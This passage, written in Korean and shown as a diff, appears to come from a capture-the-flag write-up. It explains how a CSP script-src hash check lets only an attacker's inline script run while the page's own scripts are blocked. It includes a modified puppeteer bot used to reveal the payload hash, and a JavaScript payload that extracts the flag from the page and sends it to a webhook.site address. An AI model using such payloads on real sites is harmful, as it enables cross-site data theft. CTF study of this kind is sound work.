-이를 이용하면 공격자가 직접 지정한 script만 실행시키고, 다른 flag_container를 실행하는 코드나, 삭제하는 코드는 실행시키지 않고 그대로 HTML Leak을 진행할 수 있습니다.
 
-script-src에는 sha256, 384?, 512 검사가 존재합니다. script 내부 inline 코드의 해시값을 검사하여 일치하는 코드만 실행하는데 공격자가 준 스크립트의 해시값을 검사하면 다른 스크립트는 nonce검사는 통과지만 hash 검사에서 실패하고, 
-공격자의 hash 검사는 통과하여 결과적으로 공격자의 스크립트만 실행하게 됩니다.
-
-이러한 원리를 사용하여 공격자만이 동작할 수 있는 hash 값을 설정하여 원격에서 보내려고 했지만 로돠리안이슈로 인해서 챌린지 서버에서 FLAG를 얻어낼 수 없었습니다.
-
-그래서 bot.js를 수정해서 실제 puppeteer에서 발생하는 CSP 에러를 가져오도록 코드를 작성하였습니다.
+그러면 입력할 페이로드를 sha256 해쉬화 한 값을 알아내기 위해 아래와 같이 bot.js 코드를 수정하여 SHA 해쉬를 담은 CSP 헤더 에러를 출력하게 만듭니다.
 
 ```js
 const puppeteer = require('puppeteer');
@@ -1073,17 +899,16 @@ ERR Refused to execute inline script because it violates the following Content S
 ERR Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w='". Either the 'unsafe-inline' keyword, a hash ('sha256-oVXtSIZ6oNv1VsBLKmao2GyCIe7BBHc/4lk633L90Uc='), or a nonce ('nonce-...') is required to enable inline execution.
 ```
 
-결과 값을 확인해보면 script-src의 sha 값이 "sha256-T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w=" 인 것을 확인할 수 있습니다.
+에러 로그를 살펴보면 입력했던 페이로드 값이 T6tKNQwfih13TFq8aD3/5XSY4Z3ahWY3fQdP7kE7Y3w= 인 것을 확인할 수 있습니다.
 
-이러한 값을 csp 헤더에 script-src sha 값으로 설정하게 되면, 기본적으로 설정된 flag_container 관련 스크립트는 실행되지 않고 해당 sha 값을 사용한 script만 실행되게 됩니다.
+이런식으로 sha256을 알아내어 페이로드를 입력하면 입력한 페이로드가 들어간 JS 코드만 실행하게 되면서 flag_container을 제거하는 코드는 실행이 되지 않습니다.
 
-script는 정규표현식을 사용해 FLAG 값을 webhook으로 전달하는 코드를 작성합니다.
 
 ```js
 const regex = /eval\(([^)]+)\)/g; let st = ''; while ((matches = regex.exec(document.getElementById("flag_container").innerHTML)) !== null) {st+=matches[1];}location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c?flag="+btoa(st);
 ```
 
-위 코드는 eval에서 "//" 뒤의 부분만 "flag_container"에서 가져와서 webhook으로 전달합니다.
+위와 같이 flag_container id Element에 있는 FLAG가 포함 되어 있는 eval 함수를 모두 regex으로 가져온 다음 해당 값들을 webhook에 요청하게 만들어 탈취하면 됩니다.
 
 Full Exploit 코드는 아래와 같습니다.
 
